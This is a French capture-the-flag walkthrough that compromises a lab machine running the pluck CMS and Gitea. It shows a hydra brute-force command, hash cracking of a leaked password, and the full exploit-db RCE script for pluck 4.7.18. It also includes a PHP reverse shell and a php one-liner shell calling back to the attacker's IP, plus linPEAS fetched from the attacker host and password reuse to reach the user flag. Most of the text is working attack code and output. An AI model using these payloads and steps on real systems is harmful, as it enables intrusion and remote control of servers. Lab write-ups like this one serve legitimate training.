Tout d'abord on commence par un scan.
```bash
nmap -sV -v 10.10.11.25
```

On voit qu'ils y a 3 ports d'ouverts:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  ppp?
```

Si on accède le site web au port 80, on se rend compte qu'il s'agit du CMS pluck:
```bash
 admin | powered by pluck 
```

Si on accède au port 3000, on se rend compte qu'il s'agit d'une instance de gitea:
```bash
Powered by Gitea Version: 1.21.11
```

On scanne les répertoires pour pluck et gitea, mais rien de bien intéressant:
```bash
dirb http://greenhorn.htb/
dirb http://10.10.11.25:3000/
```

En accédant à la page de login de pluck, on se rend compte qu'il s'agit de la version 4.7.18:
```bash
http://greenhorn.htb/login.php
```
On voit aussi qu'il y a champ pour le mot de passe, pas de username.

En utilisant burp, on essaye un mot de passe bidon et on intercepte la requête:
```bash
POST /login.php HTTP/1.1
Host: greenhorn.htb
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://greenhorn.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://greenhorn.htb/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=8pr8gvim4vq20s4mvbgaaknhet
Connection: close

cont1=test&bogus=&submit=Log+in
```
On voit que le champ pour le mot de passe se nomme `cont1` et il semble y avoir un champ bogus qui est envoyé aussi pour prévenir le bruteforce.

Une fois ces informations en mains, on essaye de cracker le login avec hydra et rockyou.txt:
```bash
hydra -v -V -d -l username -P /home/kali/rockyou.txt -t 16 -m "/login.php:cont1=^PASS^&bogus=&submit=Log+in:F=incorrect" http-post-form://greenhorn.htb 
```

Cependant, on se rend vite compte qu'il y a une protection contre le bruteforce
```bash
You have exceeded the number of login attempts. Please wait 5 minutes before logging in again.
```

Ayant épuisé les pistes pour pluck pour le moment, on tourne notre attention vers gitea.
En fouillant un peu, on trouve un répertoire qui semble héberger le code source pour pluck:
```bash
http://10.10.11.25:3000/GreenAdmin/GreenHorn
```

On est en mesure de créer un compte, ajouter une clé ssh et cloner le repo. Malheureusement, il n'est pas possible d'uploader un fichier avec `git push`.

En poussant l'exploration du repo plus loin, on trouve 2 fichiers intéressants, token.php et pass.php:
```php
http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token.php
<?php $token = '65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7'; ?>
```
```php
http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

On réalise vite que pass.php contient un hash sha-512.
On tente donc de le décoder avec hashcat et rockyou.txt
```bash
echo "65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7" > hash.txt
hashcat -m 1700 -a 0 hash.txt /home/kali/rockyou.txt
```

Une fois décodé, on obtient le mot de passe `iloveyou1`:
```bash
Dictionary cache hit:
* Filename..: /home/kali/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
```

Avec ce mot de passe, on est capable d'accéder à l'admin panel de pluck
```bash
http://greenhorn.htb/admin.php?action=start
```

L'accès à l'admin panel est confirmé. Encherchant un peu, on se rend compte qu'il est possible d'uploader des fichiers depuis l'admin panel. La façon parfaite d'obtenir un reverse shell !
Depuis l'admin panel, on essaye donc d'uploader un fichier `reverse-shell.php` mais le serveur ajoute automatiquement un `.txt`.
Différentes extensions donnent le même résultat `(.php5, .php7, .phtml, phar, etc)`. Il faut donc trouver une méthode alternative d'uploader un fichier.
En fouillant un peu sur `exploit-db.com` on trouve le RCE suivant:
[upload-reverse-shell.py](https://www.exploit-db.com/exploits/51592)
```python
#Exploit Title: Pluck v4.7.18 - Remote Code Execution (RCE)
#Application: pluck
#Version: 4.7.18
#Bugs:  RCE
#Technology: PHP
#Vendor URL: https://github.com/pluck-cms/pluck
#Software Link: https://github.com/pluck-cms/pluck
#Date of found: 10-07-2023
#Author: Mirabbas Ağalarov
#Tested on: Linux 


import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

login_url = "http://greenhorn.htb/login.php"
upload_url = "http://greenhorn.htb/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "iloveyou1","bogus": "","submit": "Log in"}

file_path = "/home/kali/reverse-shell.zip"

multipart_data = MultipartEncoder(
    fields={
        "sendfile": ("reverse-shell.zip", open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)


if login_response.status_code == 200:
    print("Login account")

 
    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }
    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)

    
    if upload_response.status_code == 200:
        print("ZIP file download.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)


rce_url="http://localhost/pluck/data/modules/reverse-shell/reverse-shell.php"

rce=requests.get(rce_url)

print(rce.text)
```

Il ne reste plus qu'à créer le `reverse-shell.zip` avec le `reverse-shell.php` à l'intérieur pour être exécuté par le RCE:
```php
<?php
$ip = '10.10.14.174'; // change this to your IP address
$port = 4444; // change this to your listening port
$socket = fsockopen($ip, $port);
if ($socket) {
    $shell = 'uname -a; w; id; /bin/sh -i';
    fwrite($socket, $shell);
    while (!feof($socket)) {
        $command = fgets($socket);
        $output = '';
        if ($command) {
            $output = shell_exec($command);
            fwrite($socket, $output);
        }
    }
    fclose($socket);
}
?>
```

Puis, on lance netcat pour écouter les connexions entrantes:
```bash
nc -lvnp 4444
```

On exécute finalement le script `upload-reverse-shell.py`:
```bash
python upload-reverse-shell.py
```

On voit qu'une connexion est établie à netcat:
```bash
listening on [any] 4444 ...
connect to [10.10.14.174] from (UNKNOWN) [10.10.11.25] 51092
uname -a; w; id; /bin/sh -i
```

Une fois dans le serveur, on fait un peu de recon:
```bash
whoami 
www-data
pwd
/var/www/html/pluck
ls
README.md
SECURITY.md
admin.php
data
docs
files
images
index.php
install.php
login.php
requirements.php
robots.txt
```

On se rend vite compte que le shell est assez limité, `cd` ne fonctionnant pas.
On vérifie donc quel est notre shell:
```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
vboxadd:x:998:1::/var/run/vboxadd:/bin/false
git:x:114:120:Git Version Control,,,:/home/git:/bin/bash
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
junior:x:1000:1000::/home/junior:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```
Notre shell est donc `/usr/sbin/nologin`. Cela signifie que nous serons trop limité dans nos actions. Il faut donc essayer de changer notre shell. 

Puisque pluck est un CMS codé en php, on tente de créer un deuxième reverse shell avec php pour échapper le premier:
```php
php -r '$sock=fsockopen("10.10.14.174",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
```

Il ne faut pas oublier de démarrer netcat sur notre machine:
```bash
nc -lvnp 5555
```

La connexion est établie:
```bash
listening on [any] 5555 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.25] 41880
bash: cannot set terminal process group (1114): Inappropriate ioctl for device
bash: no job control in this shell
www-data@greenhorn:~/html/pluck$ 
```

Une fois la connexion établie, on tente de naviguer dans le serveur avec le nouveau shell:
```bash
www-data@greenhorn:~/html/pluck$ cd /
cd /
www-data@greenhorn:/$ ls -la
ls -la
total 76
drwxr-xr-x  20 root root  4096 Jun 20 07:06 .
drwxr-xr-x  20 root root  4096 Jun 20 07:06 ..
lrwxrwxrwx   1 root root     7 Feb 16 18:37 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Jul 15 05:51 boot
dr-xr-xr-x   2 root root  4096 Jun 20 06:36 cdrom
drwxr-xr-x   2 root root  4096 Jun 20 06:36 data
drwxr-xr-x  20 root root  4020 Jul 25 02:41 dev
drwxr-xr-x 107 root root  4096 Jul 15 05:42 etc
drwxr-xr-x   4 root root  4096 Jun 20 06:36 home
lrwxrwxrwx   1 root root     7 Feb 16 18:37 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 16 18:37 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 10 23:33 lost+found
drwxr-xr-x   2 root root  4096 Jun 20 06:36 media
drwxr-xr-x   2 root root  4096 Jun 20 06:36 mnt
drwxr-xr-x   2 root root  4096 Jun 20 06:36 opt
dr-xr-xr-x 292 root root     0 Jul 25 02:41 proc
drwx------   5 root root  4096 Jul 25 02:48 root
drwxr-xr-x  28 root root   820 Jul 25 03:03 run
lrwxrwxrwx   1 root root     8 Feb 16 18:37 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jun 20 06:36 srv
dr-xr-xr-x  13 root root     0 Jul 25 02:41 sys
drwxrwxrwt  12 root root  4096 Jul 25 02:55 tmp
drwxr-xr-x  14 root root  4096 Jun 20 06:36 usr
drwxr-xr-x  13 root root  4096 Jun 20 06:36 var
```

Dans `/home` on trouve le répertoire `junior` qui contient un fichier `user.txt` (probablement le flag user):
```bash
www-data@greenhorn:/$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Jun 20 06:36 .
drwxr-xr-x 20 root   root   4096 Jun 20 07:06 ..
drwxr-x---  2 git    git    4096 Jun 20 06:36 git
drwxr-xr-x  3 junior junior 4096 Jun 20 06:36 junior
www-data@greenhorn:/$ ls -la /home/junior
ls -la /home/junior
total 76
drwxr-xr-x 3 junior junior  4096 Jun 20 06:36 .
drwxr-xr-x 4 root   root    4096 Jun 20 06:36 ..
lrwxrwxrwx 1 junior junior     9 Jun 11 14:38 .bash_history -> /dev/null
drwx------ 2 junior junior  4096 Jun 20 06:36 .cache
-rw-r----- 1 root   junior 61367 Jun 11 14:39 Using OpenVAS.pdf
-rw-r----- 1 root   junior    33 Jul 25 02:48 user.txt
```

Il faudrait donc réussir à se connecter avec l'utilisateur `junior` pour voir le flag.

On va utiliser [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) pour trouver des vulnérabilités pour l'escalation de privilège.
Pour le transférer sur la machine, on va télécharger le script sur notre machine et le servir:
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 80
```

Par la suite, depuis le serveur, on va télécharger `linPEAS.sh`:
```bash
cd /tmp
wget 10.10.14.174/linpeas.sh
chmod +x linpeas.sh
```

Puis, on va l'exécuter:
```bash
./linpeas.sh
....
╔══════════╣ Analyzing .service files
╚
/etc/systemd/system/gitea.service is calling this writable executable: /usr/local/bin/gitea                                                                                                  
/etc/systemd/system/multi-user.target.wants/gitea.service is calling this writable executable: /usr/local/bin/gitea

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚
132M -rwxrwxrwx 1 junior junior 132M Apr 16 03:44 /usr/local/bin/gitea
                                                                                                                         
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                  
git         1090  0.1  4.2 2063276 168748 ?      Ssl  05:43   0:01 /usr/local/bin/gitea web --config /etc/gitea/app.ini
```

En examinant les permissions sur le fichier, on dirait que junior a installé gitea mais a mal configuré les permission.
On semble pouvoir écrire sur le fichier `/usr/local/bin/gitea`, qui est lui appelé par le service `/etc/systemd/system/gitea.service`.
```bash
132M -rwxrwxrwx 1 junior junior 132M Apr 16 03:44 /usr/local/bin/gitea
```

Puisque c'est lui qui a configuré gitea et que selon le commit c'est lui qui a uploadé le fichier `pass.php` que nous avons cracké plus tôt, on réessaye le même mot de passe, `iloveyou1`:
```bash
www-data@greenhorn:/$ su junior
su junior
Password: iloveyou1
whoami
junior
ls -la
total 76
drwxr-xr-x  20 root root  4096 Jun 20 07:06 .
drwxr-xr-x  20 root root  4096 Jun 20 07:06 ..
lrwxrwxrwx   1 root root     7 Feb 16 18:37 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Jul 15 05:51 boot
dr-xr-xr-x   2 root root  4096 Jun 20 06:36 cdrom
drwxr-xr-x   2 root root  4096 Jun 20 06:36 data
drwxr-xr-x  20 root root  4020 Jul 25 02:41 dev
drwxr-xr-x 107 root root  4096 Jul 15 05:42 etc
drwxr-xr-x   4 root root  4096 Jun 20 06:36 home
lrwxrwxrwx   1 root root     7 Feb 16 18:37 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 16 18:37 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 10 23:33 lost+found
drwxr-xr-x   2 root root  4096 Jun 20 06:36 media
drwxr-xr-x   2 root root  4096 Jun 20 06:36 mnt
drwxr-xr-x   2 root root  4096 Jun 20 06:36 opt
dr-xr-xr-x 294 root root     0 Jul 25 02:41 proc
drwx------   5 root root  4096 Jul 25 02:48 root
drwxr-xr-x  28 root root   820 Jul 25 03:32 run
lrwxrwxrwx   1 root root     8 Feb 16 18:37 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jun 20 06:36 srv
dr-xr-xr-x  13 root root     0 Jul 25 02:41 sys
drwxrwxrwt  12 root root  4096 Jul 25 03:09 tmp
drwxr-xr-x  14 root root  4096 Jun 20 06:36 usr
drwxr-xr-x  13 root root  4096 Jun 20 06:36 var
```

Une fois connecté en tant que `junior`, on va afficher le flag utilisateur:
```bash
cd /home/junior
ls
user.txt
Using OpenVAS.pdf
cat user.txt
0dda172dbf48af3adec9fa5e73b7a090
```
